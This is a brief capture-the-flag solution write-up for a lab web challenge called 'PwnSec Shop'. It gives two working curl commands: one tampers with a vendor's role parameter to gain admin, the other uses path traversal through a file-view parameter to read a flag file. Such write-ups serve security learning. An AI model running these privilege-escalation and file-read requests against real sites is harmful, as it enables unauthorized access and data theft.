# Solution: PwnSec Shop
Upon reviewing the accesscontrol map, we can see that a vendor has the privilege to modify their role. As vendors, we send a request to modify our role as so:
```sh
curl -b 'connect.sid=s%3ACnPTP0aTdykPHFk4LRBS5ymxxUuZCdQH.JqvlBxKmHn7KkNadiA0CnHAfHoJmxl%2BfLkIasBNywWQ' https://pwnsecshop.alawneh.app/profile -d role=admin
```

This privilege escalation opens up new pages for us, namely, the product-photos page, where we can abuse an LFI to get the flag:
```sh
curl -b 'connect.sid=s%3ACnPTP0aTdykPHFk4LRBS5ymxxUuZCdQH.JqvlBxKmHn7KkNadiA0CnHAfHoJmxl%2BfLkIasBNywWQ' https://pwnsecshop.alawneh.app/admin/product-photos/view?file=../../../../../../../../flag.txt
```
